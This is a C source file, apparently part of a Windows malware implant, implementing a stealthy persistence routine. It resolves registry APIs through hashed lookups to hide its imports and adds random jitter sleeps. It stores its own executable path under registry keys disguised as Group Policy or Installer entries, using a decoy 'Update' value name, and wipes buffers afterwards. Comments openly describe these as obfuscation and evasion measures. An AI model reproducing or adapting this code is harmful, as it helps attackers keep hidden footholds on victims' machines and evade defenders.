#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "FunctionPntrs.h"
#include "Debug.h"

// Function type definitions
typedef LSTATUS (WINAPI* fnRegCreateKeyExW)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LSTATUS (WINAPI* fnRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LSTATUS (WINAPI* fnRegCloseKey)(HKEY);
typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR);

// Entropy-based timing function
VOID XmJitterSleep(VOID) {
    DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
    Sleep(50 + (entropy % 500));
}

// Dynamic key path generation with improved obfuscation
VOID XmGenerateSubKey(PWCHAR Buffer, SIZE_T Size) {
    const WCHAR* basePaths[] = {
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\DataStore\\Machine\\SyncRoot",
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List",
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\Components"
    };
    
    WCHAR component[32] = { 0 };
    DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
    SIZE_T baseLen = 0;
    
    // Select random base path
    const WCHAR* selectedPath = basePaths[entropy % 3];
    
    // Copy base path manually
    while(baseLen < Size - 1 && selectedPath[baseLen]) {
        Buffer[baseLen] = selectedPath[baseLen];
        baseLen++;
    }
    Buffer[baseLen] = L'\0';
    
    // Generate more complex random component
    wsprintfW(component, L"\\%x%x", 
        ((entropy ^ GetCurrentThreadId()) & 0xFFFF),
        ((GetTickCount() >> 16) ^ (entropy >> 8)) & 0xFFFF);
    
    // Append component manually
    SIZE_T compLen = 0;
    while(baseLen < Size - 1 && component[compLen]) {
        Buffer[baseLen++] = component[compLen++];
    }
    Buffer[baseLen] = L'\0';
}

BOOL XmSetPersistence(VOID) {
#ifdef DEBUG
    PRINT("[*] Starting persistence setup...\n");
#endif

    WCHAR wszPath[MAX_PATH] = { 0 };
    WCHAR wszKeyPath[MAX_PATH] = { 0 };
    HKEY hKey = NULL;
    BOOL bSuccess = FALSE;

    // Get current module path
    if (GetModuleFileNameW(NULL, wszPath, MAX_PATH) == 0) {
#ifdef DEBUG
        PRINT("[-] Failed to get module path. Error: %d\n", GetLastError());
#endif
        return FALSE;
    }

#ifdef DEBUG
    PRINT("[*] Module path: %ws\n", wszPath);
#endif

    XmJitterSleep();

    // First load advapi32.dll using LoadLibraryA
    HMODULE hKernel32 = GetModuleHandleH(SYSTEM_PROTOCOL_DLL_HASH);
    if (!hKernel32) {
#ifdef DEBUG
        PRINT("[-] Failed to get kernel32.dll handle\n");
#endif
        return FALSE;
    }

    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, DLL_LOAD_HASH);
    if (!pLoadLibraryA) {
#ifdef DEBUG
        PRINT("[-] Failed to get LoadLibraryA\n");
#endif
        return FALSE;
    }

    // Load advapi32.dll
    pLoadLibraryA("advapi32.dll");

    // Now get the handle to advapi32.dll
    HMODULE hAdvapi = GetModuleHandleH(advapi32dll_DJB2);
    if (!hAdvapi) {
#ifdef DEBUG
        PRINT("[-] Failed to get advapi32.dll handle\n");
#endif
        return FALSE;
    }

#ifdef DEBUG
    PRINT("[+] Successfully loaded advapi32.dll\n");
#endif

    fnRegCreateKeyExW pRegCreateKeyExW = (fnRegCreateKeyExW)GetProcAddressH(
        hAdvapi,
        REG_CREATE_HASH
    );

    if (!pRegCreateKeyExW) {
#ifdef DEBUG
        PRINT("[-] Failed to get RegCreateKeyExW\n");
#endif
        return FALSE;
    }

    fnRegSetValueExW pRegSetValueExW = (fnRegSetValueExW)GetProcAddressH(
        hAdvapi,
        REG_SET_VALUE_HASH
    );

    if (!pRegSetValueExW) {
#ifdef DEBUG
        PRINT("[-] Failed to get RegSetValueExW\n");
#endif
        return FALSE;
    }

    fnRegCloseKey pCloseKey = (fnRegCloseKey)GetProcAddressH(
        hAdvapi,
        REG_CLOSE_KEY_HASH
    );

    if (!pCloseKey) {
#ifdef DEBUG
        PRINT("[-] Failed to get RegCloseKey\n");
#endif
        return FALSE;
    }

#ifdef DEBUG
    PRINT("[+] Registry functions resolved\n");
#endif

    // Generate single unique key path
    XmGenerateSubKey(wszKeyPath, MAX_PATH);

#ifdef DEBUG
    PRINT("[*] Generated registry key path: %ws\n", wszKeyPath);
#endif

    // Generate less obvious value name
    WCHAR wszValueName[32] = { 0 };
    DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
    wsprintfW(wszValueName, L"Update%x%x",
        (entropy & 0xFFFF),
        (GetCurrentThreadId() & 0xFFFF));

#ifdef DEBUG
    PRINT("[*] Creating registry key...\n");
#endif

    DWORD dwError = 0;
    if (pRegCreateKeyExW(HKEY_CURRENT_USER, wszKeyPath, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        XmJitterSleep();

#ifdef DEBUG
        PRINT("[+] Key created successfully\n");
        PRINT("[*] Setting registry value...\n");
#endif

        DWORD cbData = (DWORD)((wcslen(wszPath) + 1) * sizeof(WCHAR));
        if (pRegSetValueExW(hKey, wszValueName, 0, REG_SZ,
            (BYTE*)wszPath, cbData) == ERROR_SUCCESS) {

#ifdef DEBUG
            PRINT("[+] Value set successfully\n");
#endif
            bSuccess = TRUE;
        }
        else {
            dwError = GetLastError();
#ifdef DEBUG
            PRINT("[-] Failed to set value. Error: %d\n", dwError);
#endif
        }

        if (hKey) {
            pCloseKey(hKey);
            hKey = NULL;
        }
    }
    else {
        dwError = GetLastError();
#ifdef DEBUG
        PRINT("[-] Failed to create key. Error: %d\n", dwError);
#endif
    }

    // Cleanup sensitive data
    RtlSecureZeroMemory(wszKeyPath, sizeof(wszKeyPath));
    RtlSecureZeroMemory(wszValueName, sizeof(wszValueName));
    RtlSecureZeroMemory(wszPath, sizeof(wszPath));

    return bSuccess;
}